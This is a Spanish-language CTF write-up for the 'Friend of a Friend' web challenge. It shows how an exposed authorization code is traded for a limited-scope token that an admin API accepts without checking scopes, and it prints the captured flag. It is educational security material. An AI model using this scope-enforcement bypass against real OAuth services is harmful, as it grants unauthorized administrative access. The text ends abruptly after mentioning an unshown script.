# Challenge: Friend of a Friend

**Web 300-1 Friend of a Friend**: https://pointeroverflowctf.com/challenges/

![Challenge Overview](./resources/ctf-image-1.PNG)

## Resumen
Este desafío presenta una aplicación web simulada en desarrollo que consta de dos aplicaciones web que comparten el mismo servidor de autenticación. Una es un cliente de "amigos/perfil", la otra protege una API de administración. El objetivo es explotar una vulnerabilidad en el enforcement de scopes de OAuth para obtener la flag desde la API de administración.

**URL del CTF**: https://web300-1.pointeroverflowctf.com/index.html

## Datos proporcionados
- URL de la página del CTF: https://pointeroverflowctf.com/challenges/
- Aplicación web con flujo OAuth
- API endpoints disponibles:
  - `GET /health` → ok
  - `GET /` → página de información general
  - `POST /oauth/token` → endpoint de autenticación OAuth
  - `GET /api/flag` → endpoint protegido con la flag

## Análisis inicial

Al acceder a la página principal, se presenta información sobre las características de la aplicación y un botón "Try the demo flow" que permite probar el flujo de OAuth.

![Main Page](./resources/ctf-image-2.PNG)

## Exploración del flujo OAuth

Al hacer clic en "Try the demo flow", se muestra un ejemplo de cómo utilizar el endpoint OAuth:

![Demo Flow](./resources/ctf-image-3.PNG)

```bash
curl -sX POST http://127.0.0.1:10810/oauth/token \
  -d code=Exgs-bAfOrXmCCDQxCCr9OJNm4-84D82 -d client_id=admin-app | jq -r .access_token
```

Este comando revela información crucial:
- El `state`: `tptzc59fhdi `
- Existe un código de autorización válido: `Exgs-bAfOrXmCCDQxCCr9OJNm4-84D82`
- El `client_id` es: `admin-app`
- El endpoint OAuth está en: `/oauth/token`

## Explotación

### Paso 1: Obtener el Access Token

Utilizando Postman, realizamos una petición POST al endpoint `/oauth/token` con los parámetros observados:

![Token Request](./resources/ctf-image-4.PNG)

**Response:**
```json
{
    "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJodHRwczovL2ZyaWVuZC5leGFtcGxlL29hdXRoIiwic3ViIjoidXNlcjEyMyIsImF1ZCI6ImFkbWluLWFwcCIsInNjb3BlIjoiZnJpZW5kczpyZWFkIHByb2ZpbGU6cmVhZCIsInR5cCI6ImFjY2Vzc190b2tlbiIsImlhdCI6MTc1OTYxNzY0MiwiZXhwIjoxNzU5NjE4MjQyfQ.jyGXIkRkodARysdU7y3h44orTKnXlrWrPqxYDl9AFaw",
    "aud": "admin-app",
    "expires_in": 600,
    "iss": "https://friend.example/oauth",
    "scope": "friends:read profile:read",
    "token_type": "Bearer"
}
```

### Análisis del Token JWT

El token JWT decodificado revela:
```json
{
  "iss": "https://friend.example/oauth",
  "sub": "user123",
  "aud": "admin-app",
  "scope": "friends:read profile:read",
  "typ": "access_token",
  "iat": 1759617642,
  "exp": 1759618242
}
```

**Observación crítica**: El token está destinado a la `admin-app` (`aud: "admin-app"`) pero solo tiene scopes limitados (`friends:read profile:read`). Esto sugiere una falla en el enforcement de scopes.

### Paso 2: Acceder a la API protegida

Utilizando el access token obtenido, realizamos una petición GET al endpoint `/api/flag`:

![Flag Request](./resources/ctf-image-5.PNG)

**Response:**
```json
{
    "flag": "poctf{uwsp_4_fr13nd_1n_n33d_15_4_fr13nd_1nd33d}"
}
```

## Vulnerabilidad identificada

La vulnerabilidad radica en una **falla en el enforcement de scopes OAuth**:

1. **Problema**: Aunque el token solo tiene scopes `friends:read` y `profile:read`, la API de administración (`/api/flag`) acepta el token sin validar adecuadamente que los scopes sean suficientes para acceder a recursos administrativos.

2. **Causa**: La aplicación verifica que el token esté destinado a la `admin-app` (campo `aud`) pero no valida que los scopes incluyan permisos administrativos como `admin:read` o similar.

3. **Impacto**: Esto permite que un usuario con scopes limitados acceda a endpoints administrativos protegidos.

## Resultado

**Flag obtenida**: `poctf{uwsp_4_fr13nd_1n_n33d_15_4_fr13nd_1nd33d}`

### Ejecucion del script
Es necesario instalar la libreria request
```bash
pip install requests
```